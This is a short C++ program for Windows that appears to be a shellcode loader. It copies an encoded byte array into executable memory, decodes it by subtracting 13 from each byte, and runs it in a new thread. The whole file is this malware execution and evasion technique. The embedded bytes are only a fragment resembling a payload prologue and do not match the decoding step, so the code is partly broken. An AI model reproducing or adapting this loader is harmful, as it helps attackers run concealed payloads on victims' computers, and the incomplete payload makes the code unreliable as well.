#include <windows.h>


int main() {
    using namespace std;
    const char shellcode[] = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50";
    void* shellcode_exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);

    for (int i = 0; i < sizeof(shellcode); ++i){
        ((char*)shellcode_exec)[i] = ((char*)shellcode_exec)[i] - 13;
    }


    DWORD threadID;
    HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE) shellcode_exec, NULL, 0, &threadID);
    WaitForSingleObject(hThread, INFINITE);
}
